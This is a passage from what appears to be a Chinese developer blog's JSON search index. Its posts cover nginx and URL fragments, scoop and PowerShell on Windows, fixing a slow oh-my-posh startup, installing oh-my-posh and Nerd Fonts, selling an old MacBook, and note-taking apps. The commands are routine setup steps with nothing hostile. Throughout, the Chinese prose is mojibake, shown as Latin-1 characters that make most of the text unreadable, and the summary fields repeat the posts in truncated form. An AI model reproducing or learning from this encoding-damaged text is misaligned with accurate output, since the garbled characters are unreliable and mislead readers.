èŠ‚çš„å†…å®¹ï¼Œfragç‰‡æ®µå¯ä»¥å‘Šè¯‰æµè§ˆå™¨ï¼Œåº”è¯¥å°†æŸä¸ªç‰¹å®šçš„ç‚¹æ˜¾ç¤ºåœ¨æµè§ˆå™¨ä¸­ã€‚\nä¾‹å¦‚ https://github.com/wangduanduan/jsplumb-chinese-tutorial/blob/master/api/anchors.js#L18\nè¿™é‡Œçš„#L8å°±æ˜¯ä¸€ä¸ªfragç‰‡æ®µï¼Œ å½“æµè§ˆå™¨æ‰“å¼€è¿™ä¸ªé¡µé¢çš„æ—¶ï¼Œå°±ä¼šè·³åˆ°å¯¹åº”çš„è¡Œ\nåœ¨ç½‘ç»œé¢æ¿ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œå®é™…ä¸Šæµè§ˆå™¨å‘å‡ºçš„è¯·æ±‚ï¼Œä¹Ÿæ²¡æœ‰å¸¦æœ‰fragå‚æ•°\nVue åœ¨Vueä¸­ï¼Œé»˜è®¤çš„è·¯ç”±å°±æ˜¯è¿™ç§fragç‰‡æ®µã€‚ è¿™ç§è·¯ç”±åªå¯¹æµè§ˆå™¨æœ‰æ•ˆï¼Œå¹¶ä¸ä¼šå‘é€åˆ°æœåŠ¡ç«¯ã€‚\næ‰€ä»¥åœ¨ä¸€ä¸ªå•é¡µåº”ç”¨ä¸­ï¼ŒæœåŠ¡ç«¯æ˜¯æ— æ³•æ ¹æ®URLçŸ¥é“ç”¨æˆ·è®¿é—®çš„æ˜¯ä»€ä¹ˆé¡µé¢çš„ã€‚\næ‰€ä»¥å®é™…ä¸Šnginxæ— æ³•æ ¹æ®fragç‰‡æ®µè¿›è¡Œæ‹¦æˆªã€‚\nnginxè·¯å¾„æ‹¦æˆª location [modifier] [URI] { ... ... } modifier\n= å®Œå…¨åŒ¹é… ^~ æ­£åˆ™åŒ¹é…ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ä»¥ç‰¹å®šçš„URLå¼€å¤´ ~ æ­£åˆ™åŒ¹é…ï¼Œä¸”å¤§å°å†™æ•æ„Ÿ ~* æ­£åˆ™åŒ¹é…ï¼Œå¤§å°å†™ä¸æ•æ„Ÿ nginxè·¯å¾„åŒ¹é…è§„åˆ™\né¦–å…ˆä½¿å®Œå…¨åŒ¹é…ï¼Œä¸€æ—¦åŒ¹é…ï¼Œåˆ™åŒ¹é…ç»“æŸï¼Œè¿›è¡Œåç»­æ•°æ®å¤„ç† å®Œå…¨åŒ¹é…æ— æ³•æ‰¾åˆ°ï¼Œåˆ™è¿›è¡Œæœ€é•¿URLåŒ¹é…ï¼Œç±»ä¼¼ ^~ æœ€é•¿åŒ¹é…æ‰¾ä¸åˆ°ï¼Œåˆ™æŒ‰ç…§ ~æˆ–è€…~*çš„æ–¹å¼åŒ¹é… æœ€åæŒ‰ç…§ / çš„é»˜è®¤åŒ¹é… ","title":"è¯·é—®nginx èƒ½å¦æ ¹æ® frag ç‰‡æ®µ è¿›è¡Œè·¯å¾„è½¬å‘ï¼Ÿ"},{"content":"æˆ‘å·²ç»æœ‰5å¹´æ²¡æœ‰ç”¨è¿‡windowsäº†ï¼Œå†æ¬¡åœ¨windowsä¸Šæå¼€å‘ï¼Œå‘ç°äº†windowså¯¹äºå¼€å‘è€…æ¥è¯´ï¼Œå‹å¥½äº†ä¸å°‘ã€‚\né¦–å…ˆæ˜¯windows terminal, è¿™ä¸ªç»ˆç«¯åšçš„è¿˜ä¸é”™ã€‚\nå…¶æ¬¡æ˜¯ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ï¼Œæ¯”å¦‚è¯´ssh, scpç­‰ï¼Œéƒ½å·²ç»é»˜è®¤é™„å¸¦äº†ï¼Œä¸ç”¨å†å®‰è£…ã€‚\nè¿˜æœ‰åŒ…ç®¡ç†å·¥å…·scoop, å‘½ä»¤è¡Œæç¤ºå·¥å…· oh-my-posh, ä»¥åŠpowershell 7 åŠ è½½ä¸€èµ·ï¼ŒåŸºæœ¬å¯ä»¥è¿ç§»80%å·¦å³çš„linuxä¸Šçš„å¼€å‘ç¯å¢ƒã€‚\nç‰¹åˆ«è¦è¯´æ˜ä¸€ä¸‹scoopï¼Œ è¿™ä¸ªåŒ…ç®¡ç†å·¥å…·ï¼Œæˆ‘å®‰è£…äº†åœ¨linuxä¸Šå¸¸ç”¨çš„ä¸€äº›è½¯ä»¶ã€‚\nåŒ…æ‹¬æœ‰ä»¥ä¸‹çš„è½¯ä»¶ï¼Œè€Œä¸”è½¯ä»¶çš„ç‰ˆæœ¬éƒ½è¿˜è›®æ–°çš„ã€‚\n0ad 0.0.25b games 7zip 22.00 main curl 7.84.0_4 main curlie 1.6.9 main diff-so-fancy 1.4.3 main duf 0.8.1 main everything gawk 5.1.1 main git 2.37.0.windows.1 main git-aliases 0.3.5 extras git-chglog 0.15.1 main gzip 1.3.12 main hostctl 1.1.2 main hugo 0.101.0 main jq 1.6 main klogg 22.06.0.1289 extras make 4.3 main neofetch 7.1.0 main neovim 0.7.2 main netcat 1.12 main nodejs-lts 16.16.0 main ntop 0.3.4 main procs 0.12.3 main ripgrep 13.0.0 main sudo 0.2020.01.26 main tar 1.23 main å¦å¤–ä¸€ä¸ªå°±æ˜¯powershell 7äº†ï¼Œè´´ä¸‹æˆ‘çš„profileé…ç½®ã€‚\næ™ºèƒ½æç¤ºï¼Œreadlineéƒ½æœ‰äº†\noh-my-posh init pwsh --config ~/default.omp.json | Invoke-Expression Import-Module PSReadLine New-Alias -Name ll -Value ls if ($host.Name -eq \u0026#39;ConsoleHost\u0026#39;) { Import-Module PSReadLine Set-PSReadLineOption -EditMode Emacs } ","permalink":"https://wdd.js.org/posts/2022/07/crofgr/","summary":"æˆ‘å·²ç»æœ‰5å¹´æ²¡æœ‰ç”¨è¿‡windowsäº†ï¼Œå†æ¬¡åœ¨windowsä¸Šæå¼€å‘ï¼Œå‘ç°äº†windowså¯¹äºå¼€å‘è€…æ¥è¯´ï¼Œå‹å¥½äº†ä¸å°‘ã€‚\né¦–å…ˆæ˜¯windows terminal, è¿™ä¸ªç»ˆç«¯åšçš„è¿˜ä¸é”™ã€‚\nå…¶æ¬¡æ˜¯ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ï¼Œæ¯”å¦‚è¯´ssh, scpç­‰ï¼Œéƒ½å·²ç»é»˜è®¤é™„å¸¦äº†ï¼Œä¸ç”¨å†å®‰è£…ã€‚\nè¿˜æœ‰åŒ…ç®¡ç†å·¥å…·scoop, å‘½ä»¤è¡Œæç¤ºå·¥å…· oh-my-posh, ä»¥åŠpowershell 7 åŠ è½½ä¸€èµ·ï¼ŒåŸºæœ¬å¯ä»¥è¿ç§»80%å·¦å³çš„linuxä¸Šçš„å¼€å‘ç¯å¢ƒã€‚\nç‰¹åˆ«è¦è¯´æ˜ä¸€ä¸‹scoopï¼Œ è¿™ä¸ªåŒ…ç®¡ç†å·¥å…·ï¼Œæˆ‘å®‰è£…äº†åœ¨linuxä¸Šå¸¸ç”¨çš„ä¸€äº›è½¯ä»¶ã€‚\nåŒ…æ‹¬æœ‰ä»¥ä¸‹çš„è½¯ä»¶ï¼Œè€Œä¸”è½¯ä»¶çš„ç‰ˆæœ¬éƒ½è¿˜è›®æ–°çš„ã€‚\n0ad 0.0.25b games 7zip 22.00 main curl 7.84.0_4 main curlie 1.6.9 main diff-so-fancy 1.4.3 main duf 0.8.1 main everything gawk 5.1.1 main git 2.37.0.windows.1 main git-aliases 0.3.5 extras git-chglog 0.15.1 main gzip 1.3.12 main hostctl 1.1.2 main hugo 0.101.0 main jq 1.6 main klogg 22.06.0.1289 extras make 4.3 main neofetch 7.1.0 main neovim 0.7.2 main netcat 1.","title":"windows ä¸Šçš„å‘½ä»¤è¡Œä½“éªŒ"},{"content":"æ¯æ¬¡æ‰“å¼€æ–°çš„æ ‡ç­¾é¡µï¼ŒPowershell éƒ½ä¼šè¾“å‡ºä¸‹é¢çš„ä»£ç \nLoading personal and system profiles took 3566ms. æ—¶é—´ä¸å›ºå®šï¼Œæœ‰æ—¶1såˆ°10séƒ½å¯èƒ½æœ‰ï¼Œæ—¶é—´ä¸å›ºå®šã€‚ è¿™ä¸ªåŠ è½½é€Ÿåº¦æ˜¯éå¸¸æ…¢çš„ã€‚\nç„¶åæˆ‘æ‰“å¼€ä¸€ä¸ªéoh-my-poshçš„çª—å£ï¼Œè¾“å…¥\noh-my-posh debug çœ‹åˆ°å…¶ä¸­å‡ è¡Œæ—¥å¿—ï¼š\n2022/07/09 12:20:23 error: HTTPRequest Get \u0026#34;https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json\u0026#34;: context deadline exceeded 2022/07/09 12:20:23 HTTPRequest duration: 5.0072715s, args: https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json 2022/07/09 12:20:23 downloadConfig duration: 5.0072715s, args: https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json 2022/07/09 12:20:23 resolveConfigPath duration: 5.0072715s, args: 2022/07/09 12:20:23 Init duration: 5.0072715s, args: å¥½å®¶ä¼™ï¼ŒåŸæ¥æ¯æ¬¡å¯åŠ¨ï¼Œoh-my-poshè¿˜å»githubä¸Šä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ã€‚\nå› ä¸ºä¸‹è½½æ–‡ä»¶è€Œæ‹–æ…¢äº†æ•´ä¸ªå¯åŠ¨è¿‡ç¨‹ã€‚\nç„¶ååœ¨github issueä¸Šå€’æ‰¾ï¼šhttps://github.com/JanDeDobbeleer/oh-my-posh/issues/2251\noh-my-posh init pwsh \u0026ndash;config ~/default.omp.json\nå…¶ä¸­å…³é”®ä¸€ç‚¹æ˜¯å¯åŠ¨oh-my-poshçš„æ—¶å€™ï¼Œå¦‚æœä¸ç”¨\u0026ndash;configé…ç½®é»˜è®¤çš„æ–‡ä»¶ï¼Œoh-my-poshå°±å›å»ä¸‹è½½é»˜è®¤çš„é…ç½®æ–‡ä»¶ã€‚\næ‰€ä»¥é—®é¢˜å°±å¥½è§£å†³äº†ã€‚\né¦–å…ˆä¸‹è½½https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åå†ä¿å­˜åˆ°ç”¨æˆ·çš„å®¶ç›®å½•é‡Œé¢ã€‚\nç„¶åæ‰“å¼€terminal, è¾“å…¥ï¼š code $profile\nå‰ææ˜¯ä½ çš„ç”µè„‘ä¸Šè¦è£…è¿‡vscode, ç„¶åç»™é»˜è®¤çš„profileåŠ ä¸Š\u0026ndash;configå‚æ•°ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œé—®é¢˜è§£å†³ã€‚\noh-my-posh init pwsh --config ~/default.omp.json | Invoke-Expression Import-Module PSReadLine New-Alias -Name ll -Value ls if ($host.Name -eq \u0026#39;ConsoleHost\u0026#39;) { Import-Module PSReadLine Set-PSReadLineOption -EditMode Emacs } ","permalink":"https://wdd.js.org/posts/2022/07/igur01/","summary":"æ¯æ¬¡æ‰“å¼€æ–°çš„æ ‡ç­¾é¡µï¼ŒPowershell éƒ½ä¼šè¾“å‡ºä¸‹é¢çš„ä»£ç \nLoading personal and system profiles took 3566ms. æ—¶é—´ä¸å›ºå®šï¼Œæœ‰æ—¶1såˆ°10séƒ½å¯èƒ½æœ‰ï¼Œæ—¶é—´ä¸å›ºå®šã€‚ è¿™ä¸ªåŠ è½½é€Ÿåº¦æ˜¯éå¸¸æ…¢çš„ã€‚\nç„¶åæˆ‘æ‰“å¼€ä¸€ä¸ªéoh-my-poshçš„çª—å£ï¼Œè¾“å…¥\noh-my-posh debug çœ‹åˆ°å…¶ä¸­å‡ è¡Œæ—¥å¿—ï¼š\n2022/07/09 12:20:23 error: HTTPRequest Get \u0026#34;https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json\u0026#34;: context deadline exceeded 2022/07/09 12:20:23 HTTPRequest duration: 5.0072715s, args: https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json 2022/07/09 12:20:23 downloadConfig duration: 5.0072715s, args: https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json 2022/07/09 12:20:23 resolveConfigPath duration: 5.0072715s, args: 2022/07/09 12:20:23 Init duration: 5.0072715s, args: å¥½å®¶ä¼™ï¼ŒåŸæ¥æ¯æ¬¡å¯åŠ¨ï¼Œoh-my-poshè¿˜å»githubä¸Šä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ã€‚\nå› ä¸ºä¸‹è½½æ–‡ä»¶è€Œæ‹–æ…¢äº†æ•´ä¸ªå¯åŠ¨è¿‡ç¨‹ã€‚\nç„¶ååœ¨github issueä¸Šå€’æ‰¾ï¼šhttps://github.com/JanDeDobbeleer/oh-my-posh/issues/2251\noh-my-posh init pwsh \u0026ndash;config ~/default.omp.json\nå…¶ä¸­å…³é”®ä¸€ç‚¹æ˜¯å¯åŠ¨oh-my-poshçš„æ—¶å€™ï¼Œå¦‚æœä¸ç”¨\u0026ndash;configé…ç½®é»˜è®¤çš„æ–‡ä»¶ï¼Œoh-my-poshå°±å›å»ä¸‹è½½é»˜è®¤çš„é…ç½®æ–‡ä»¶ã€‚\næ‰€ä»¥é—®é¢˜å°±å¥½è§£å†³äº†ã€‚\né¦–å…ˆä¸‹è½½https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åå†ä¿å­˜åˆ°ç”¨æˆ·çš„å®¶ç›®å½•é‡Œé¢ã€‚\nç„¶åæ‰“å¼€terminal, è¾“å…¥ï¼š code $profile\nå‰ææ˜¯ä½ çš„ç”µè„‘ä¸Šè¦è£…è¿‡vscode, ç„¶åç»™é»˜è®¤çš„profileåŠ ä¸Š\u0026ndash;configå‚æ•°ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œé—®é¢˜è§£å†³ã€‚\noh-my-posh init pwsh --config ~/default.","title":"powershell oh-my-posh åŠ è½½æ•°æ®å¤ªæ…¢"},{"content":"0. å‰ææ¡ä»¶ ç³»ç»Ÿæ˜¯windows11 å·²ç»å®‰è£…è¿‡powershell 7 å®‰è£…è¿‡vscodeç¼–è¾‘å™¨ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰å‘½ä»¤å‡åœ¨powershellä¸‹æ‰§è¡Œçš„ 1. å®‰è£… oh my posh 1.2 æ–¹å¼1ï¼š é€šè¿‡ä»£ç†å®‰è£… å‡å¦‚ä½ æœ‰socksä»£ç†ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨wingetå®‰è£…\næ‰“å¼€ä½ çš„power shell æ‰§è¡Œç±»ä¼¼ä¸‹é¢çš„å‘½ä»¤ï¼Œæ¥é…ç½®ä»£ç†\n$env:all_proxy=\u0026#34;socks5://127.0.0.1:1081\u0026#34; å¦‚æœæ²¡æœ‰socksä»£ç†ï¼Œæœ€å¥½ä¸è¦ç”¨wingetå®‰è£…ï¼Œå› ä¸ºé€Ÿåº¦å¤ªæ…¢ã€‚ç„¶åæ‰§è¡Œï¼š\nwinget install JanDeDobbeleer.OhMyPosh -s winget 1.2 æ–¹å¼2ï¼š ä¸‹è½½exeï¼Œæ‰‹å·¥å®‰è£… å†oh-my-poshçš„releaseç•Œé¢ https://github.com/JanDeDobbeleer/oh-my-posh/releases\nå¯ä»¥çœ‹åˆ°å¾ˆå¤šç‰ˆæœ¬çš„æ–‡ä»¶ï¼Œwindowsé€‰æ‹©install-amd64.exe, ä¸‹è½½å®Œäº†ä¹‹åæ‰‹å·¥ç‚¹å‡»æ‰§è¡Œæ¥å®‰è£…ã€‚\nhttps://github.com/JanDeDobbeleer/oh-my-posh/releases/download/v8.13.1/install-amd64.exe\n2. é…ç½® oh-my-posh åœ¨powershellä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œvscodeå›æ‰“å¼€å¯¹åº”çš„æ–‡ä»¶ã€‚\ncode $PROFILE åœ¨æ–‡ä»¶ä¸­ç²˜è´´å¦‚ä¸‹çš„å†…å®¹ï¼š\noh-my-posh init pwsh | Invoke-Expression ä¿å­˜æ–‡ä»¶ï¼Œç„¶åå†æ¬¡æ‰“å¼€windows termial, è¾“å…¥ä¸‹é¢çš„å‘½ä»¤æ¥reload profile\n. $PROFILE ç„¶åä½ å¯ä»¥çœ‹åˆ°ç»ˆç«¯å‡ºç°äº†æç¤ºç¬¦ï¼Œæœ‰å¯èƒ½æœ‰ç‚¹å¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯æœ‰ç‚¹æ…¢çš„ã€‚ä½†æ˜¯å¾ˆå¤šç¬¦å·å¯èƒ½æ˜¯ä¹±ç ï¼Œå› ä¸ºæ˜¯æ²¡æœ‰é…ç½®ç›¸å…³çš„å­—ä½“ã€‚\n3. å­—ä½“é…ç½® 3.1 å®‰è£…å­—ä½“ ä¸‹è½½æ–‡ä»¶ https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/Meslo.zip è§£å‹æ–‡ä»¶ æ‰“å¼€è®¾ç½®ï¼Œåœ¨ä¸ªæ€§åŒ–ã€‹å­—ä½“ä¸­ï¼Œå°†ä¹‹å‰ä¸‹è½½å¥½çš„æ‰€æœ‰å­—ä½“ï¼Œæ‹–åŠ¨åˆ°ä¸‹é¢çš„çº¢æ¡†ä¸­ï¼Œå­—ä½“å°±ä¼šè‡ªåŠ¨å®‰è£… 3.2 windows termialå­—ä½“é…ç½® ç”¨vscodeæ‰“å¼€å¯¹windows termialçš„é…ç½®jsonæ–‡ä»¶ï¼Œåœ¨profiles.default.fontä¸­é…ç½®å¦‚ä¸‹å­—ä½“\n\u0026#34;font\u0026#34;: { \u0026#34;face\u0026#34;: \u0026#34;MesloLGM NF\u0026#34; } é…ç½®ä¹‹åï¼Œéœ€è¦é‡å¯windows termial\n3.3 vscode termial é…ç½® åœ¨vscodeä¸­è¾“å…¥ Open Sett, å°±å¯ä»¥æ‰“å¼€è®¾ç½®çš„jsonæ–‡ä»¶ã€‚\nåœ¨é…ç½®ä¸­è®¾ç½®å¦‚ä¸‹çš„å†…å®¹\n\u0026#34;terminal.integrated.fontFamily\u0026#34;: \u0026#34;MesloLGM NF\u0026#34;, 4. æ•ˆæœå±•ç¤º 4.1 windows terminal 4.2 vscode terminal 5. ä½“éªŒ ä¼˜ç‚¹ oh-my-posh æ€»ä½“è¿˜ä¸é”™ï¼Œèƒ½å¤Ÿæ–¹ä¾¿çš„å±•ç¤ºgitç›¸å…³çš„ä¿¡æ¯ ç¼ºç‚¹ æ€§èƒ½æ‹‰è·¨ï¼Œæ¯æ¬¡ç»ˆç«¯å¯èƒ½éœ€è¦0.5såˆ°2sä¹‹é—´çš„å»¶è¿Ÿå¡é¡¿ï¼Œç›¸æ¯”äºlinuxä¸Šçš„shellè¦æ…¢ä¸å°‘ 6. å‚è€ƒæ–‡çŒ® https://ohmyposh.dev/docs/installation/prompt ","permalink":"https://wdd.js.org/posts/2022/07/ssgb9f/","summary":"0. å‰ææ¡ä»¶ ç³»ç»Ÿæ˜¯windows11 å·²ç»å®‰è£…è¿‡powershell 7 å®‰è£…è¿‡vscodeç¼–è¾‘å™¨ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰å‘½ä»¤å‡åœ¨powershellä¸‹æ‰§è¡Œçš„ 1. å®‰è£… oh my posh 1.2 æ–¹å¼1ï¼š é€šè¿‡ä»£ç†å®‰è£… å‡å¦‚ä½ æœ‰socksä»£ç†ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨wingetå®‰è£…\næ‰“å¼€ä½ çš„power shell æ‰§è¡Œç±»ä¼¼ä¸‹é¢çš„å‘½ä»¤ï¼Œæ¥é…ç½®ä»£ç†\n$env:all_proxy=\u0026#34;socks5://127.0.0.1:1081\u0026#34; å¦‚æœæ²¡æœ‰socksä»£ç†ï¼Œæœ€å¥½ä¸è¦ç”¨wingetå®‰è£…ï¼Œå› ä¸ºé€Ÿåº¦å¤ªæ…¢ã€‚ç„¶åæ‰§è¡Œï¼š\nwinget install JanDeDobbeleer.OhMyPosh -s winget 1.2 æ–¹å¼2ï¼š ä¸‹è½½exeï¼Œæ‰‹å·¥å®‰è£… å†oh-my-poshçš„releaseç•Œé¢ https://github.com/JanDeDobbeleer/oh-my-posh/releases\nå¯ä»¥çœ‹åˆ°å¾ˆå¤šç‰ˆæœ¬çš„æ–‡ä»¶ï¼Œwindowsé€‰æ‹©install-amd64.exe, ä¸‹è½½å®Œäº†ä¹‹åæ‰‹å·¥ç‚¹å‡»æ‰§è¡Œæ¥å®‰è£…ã€‚\nhttps://github.com/JanDeDobbeleer/oh-my-posh/releases/download/v8.13.1/install-amd64.exe\n2. é…ç½® oh-my-posh åœ¨powershellä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œvscodeå›æ‰“å¼€å¯¹åº”çš„æ–‡ä»¶ã€‚\ncode $PROFILE åœ¨æ–‡ä»¶ä¸­ç²˜è´´å¦‚ä¸‹çš„å†…å®¹ï¼š\noh-my-posh init pwsh | Invoke-Expression ä¿å­˜æ–‡ä»¶ï¼Œç„¶åå†æ¬¡æ‰“å¼€windows termial, è¾“å…¥ä¸‹é¢çš„å‘½ä»¤æ¥reload profile\n. $PROFILE ç„¶åä½ å¯ä»¥çœ‹åˆ°ç»ˆç«¯å‡ºç°äº†æç¤ºç¬¦ï¼Œæœ‰å¯èƒ½æœ‰ç‚¹å¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯æœ‰ç‚¹æ…¢çš„ã€‚ä½†æ˜¯å¾ˆå¤šç¬¦å·å¯èƒ½æ˜¯ä¹±ç ï¼Œå› ä¸ºæ˜¯æ²¡æœ‰é…ç½®ç›¸å…³çš„å­—ä½“ã€‚\n3. å­—ä½“é…ç½® 3.1 å®‰è£…å­—ä½“ ä¸‹è½½æ–‡ä»¶ https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/Meslo.zip è§£å‹æ–‡ä»¶ æ‰“å¼€è®¾ç½®ï¼Œåœ¨ä¸ªæ€§åŒ–ã€‹å­—ä½“ä¸­ï¼Œå°†ä¹‹å‰ä¸‹è½½å¥½çš„æ‰€æœ‰å­—ä½“ï¼Œæ‹–åŠ¨åˆ°ä¸‹é¢çš„çº¢æ¡†ä¸­ï¼Œå­—ä½“å°±ä¼šè‡ªåŠ¨å®‰è£… 3.2 windows termialå­—ä½“é…ç½® ç”¨vscodeæ‰“å¼€å¯¹windows termialçš„é…ç½®jsonæ–‡ä»¶ï¼Œåœ¨profiles.default.fontä¸­é…ç½®å¦‚ä¸‹å­—ä½“\n\u0026#34;font\u0026#34;: { \u0026#34;face\u0026#34;: \u0026#34;MesloLGM NF\u0026#34; } é…ç½®ä¹‹åï¼Œéœ€è¦é‡å¯windows termial","title":"windows11 å®‰è£… oh my posh"},{"content":"è‡ªä»æˆ‘æ¢äº†æ–°æ¬¾çš„æƒ æ™®æˆ˜Xä¹‹åï¼Œæˆ‘çš„è€æ­æ¡£ï¼Œ2017æ¬¾çš„macbook proï¼Œ å·²ç»åœ¨æ²™å‘ä¸Šèººäº†å¾ˆä¹…äº†ã€‚\næˆ‘æ‹äº†æ‹å®ƒçš„è„‘è¢‹ï¼Œå¯¹å®ƒè¯­é‡å¿ƒé•¿çš„è¯´ï¼š äººä¸èƒ½é—²ç€ï¼Œé—²ç€å®¹æ˜“ç”Ÿç—…ï¼Œç¬”è®°æœ¬ä¹Ÿæ˜¯å¦‚æ­¤ã€‚è™½ç„¶ä½ å·²ç»æ˜¯5å¹´å‰çš„mbpäº†ï¼Œ ä½†æ˜¯å»‰é¢‡è€çŸ£ï¼Œå°šèƒ½é¥­å¦ï¼Ÿ\nmbpé¢æ— è¡¨æƒ…ï¼Œèƒ¡å­é‚‹é¢ï¼Œæœæˆ‘ç¥äº†ä¸€çœ¼ï¼Œåƒæ˜¯å˜²è®½ï¼Œåˆåƒæ˜¯ä¸æ»¡ï¼Œä¸€å£æ°”å¸æ‰è¿˜å‰©ä¸€ç‚¹çš„é¦™çƒŸï¼Œæœ‰æ°”æ— åŠ›çš„è¯´ï¼šæˆ‘å·²ç»å·¥ä½œäº”å¹´äº†ï¼ŒæŒ‰ç…§å›½å®¶çš„æ³•å¾‹è§„å®šï¼Œå·²ç»åˆ°äº†é€€ä¼‘çš„å¹´é¾„ï¼Œæ˜¯è¯¥äº«å—äº«å—äº†ã€‚\næˆ‘\n","permalink":"https://wdd.js.org/posts/2022/07/guv65u/","summary":"è‡ªä»æˆ‘æ¢äº†æ–°æ¬¾çš„æƒ æ™®æˆ˜Xä¹‹åï¼Œæˆ‘çš„è€æ­æ¡£ï¼Œ2017æ¬¾çš„macbook proï¼Œ å·²ç»åœ¨æ²™å‘ä¸Šèººäº†å¾ˆä¹…äº†ã€‚\næˆ‘æ‹äº†æ‹å®ƒçš„è„‘è¢‹ï¼Œå¯¹å®ƒè¯­é‡å¿ƒé•¿çš„è¯´ï¼š äººä¸èƒ½é—²ç€ï¼Œé—²ç€å®¹æ˜“ç”Ÿç—…ï¼Œç¬”è®°æœ¬ä¹Ÿæ˜¯å¦‚æ­¤ã€‚è™½ç„¶ä½ å·²ç»æ˜¯5å¹´å‰çš„mbpäº†ï¼Œ ä½†æ˜¯å»‰é¢‡è€çŸ£ï¼Œå°šèƒ½é¥­å¦ï¼Ÿ\nmbpé¢æ— è¡¨æƒ…ï¼Œèƒ¡å­é‚‹é¢ï¼Œæœæˆ‘ç¥äº†ä¸€çœ¼ï¼Œåƒæ˜¯å˜²è®½ï¼Œåˆåƒæ˜¯ä¸æ»¡ï¼Œä¸€å£æ°”å¸æ‰è¿˜å‰©ä¸€ç‚¹çš„é¦™çƒŸï¼Œæœ‰æ°”æ— åŠ›çš„è¯´ï¼šæˆ‘å·²ç»å·¥ä½œäº”å¹´äº†ï¼ŒæŒ‰ç…§å›½å®¶çš„æ³•å¾‹è§„å®šï¼Œå·²ç»åˆ°äº†é€€ä¼‘çš„å¹´é¾„ï¼Œæ˜¯è¯¥äº«å—äº«å—äº†ã€‚\næˆ‘","title":"å…³äºæˆ‘åœ¨é—²é±¼å–äºŒæ‰‹è¿™ä»¶äº‹"},{"content":"æˆ‘æœ€æ—©ç”¨è¿‡æœ‰é“ï¼Œæˆ‘è§‰å¾—æœ‰é“å¾ˆçƒ‚ã€‚\nåæ¥æˆ‘å¼€å§‹ç”¨å°è±¡ç¬”è®°ï¼Œæˆ‘å‘ç°å°è±¡ç¬”è®°æ›´çƒ‚ã€‚ä¸ä»…ç•Œé¢åšçš„è®©äººè§‰å¾—ä¾®è¾±çœ¼ç›ï¼Œå³ä½¿ä½ å¼€äº†ä¼šå‘˜ä¹Ÿè¦çœ‹å¹¿å‘Šã€‚ å°è±¡ç¬”è®°ä¼šå‘˜è¢«å‰²äº†éŸ­èœï¼Œå……åˆ°äº†2026å¹´ï¼Œä½†æ˜¯æˆ‘æœ€è¿‘ä¸€ä¸¤å¹´æˆ‘åŸºæœ¬æ²¡æœ‰ç”¨è¿‡å°è±¡ç¬”è®°ã€‚\nåæ¥æˆ‘é‡åˆ°äº†æ–‡æ¡£blogç•Œçš„new school, notionã€è¯­é›€ã€é£ä¹¦ï¼Œ å°±å®Œå…¨æŠ›å¼ƒäº†æœ‰é“å’Œå°è±¡ç¬”è®°çš„old schoolã€‚\nåšä»»ä½•äº‹æƒ…ï¼Œéƒ½éœ€è¦åŠ¨æœºã€‚\nå†™å…¬å¼€åšå®¢ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å¯èƒ½æœ‰ä»¥ä¸‹åŸå› \næå‡ä¸ªäººå½±å“åŠ› æé«˜è‡ªå·±çš„è¡¨è¾¾èƒ½åŠ› çŸ¥è¯†ç§¯ç´¯å’Œåˆ†äº« å…¬å¼€åšå®¢éœ€è¦ä¸‰æ–¹è§’åŠ›ï¼Œå¹³å°æ–¹ã€å†…å®¹ç”Ÿäº§è€…ã€å†…å®¹æ¶ˆè´¹è€…(è¯»è€…)ã€‚\nä½œä¸ºå†…å®¹ç”Ÿäº§è€…ï¼Œæˆ‘ä»¬ä»é€‰æ‹©ä¸€ä¸ªå¹³å°æ˜¯éœ€è¦å¾ˆå¤šç†ç”±çš„ã€‚å¯èƒ½æ˜¯UIç•Œé¢çš„é¢œå€¼ï¼Œå¯èƒ½æ˜¯ä¸€è§é’Ÿæƒ…ç•Œé¢äº¤äº’ã€‚\nå°±åƒç”·å¥³çš„ç›¸äº²ï¼Œé¦–å…ˆè¦è¢«å¤–è²Œå¸å¼•ï¼Œæ‰èƒ½æœ‰ä¸‹æ–‡ã€‚\nç„¶è€Œé™¤äº†é‚£ä¸€è§é’Ÿæƒ…çš„å¿…ç„¶æ˜¯çŸ­æš‚çš„ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘å‘ç°äº†å¦ä¸€ä¸ªé‡è¦åŸå› ï¼šè¿ç§»æˆæœ¬\næˆ‘ä»¥å‰å†³å®šä¸ç”¨å°è±¡çš„æ—¶å€™ï¼Œå°è±¡ç¬”è®°ä¸Šè¿˜æœ‰æˆ‘å°†è¿‘ä¸€åƒå¤šç¯‡çš„ç¬”è®°ã€‚è™½è¯´å°è±¡ç¬”è®°æœ‰å¯¼å‡ºå·¥å…·ï¼Œä½†æ˜¯åªæœ‰å½“ä½ ç”¨çš„æ—¶å€™ï¼Œä½ 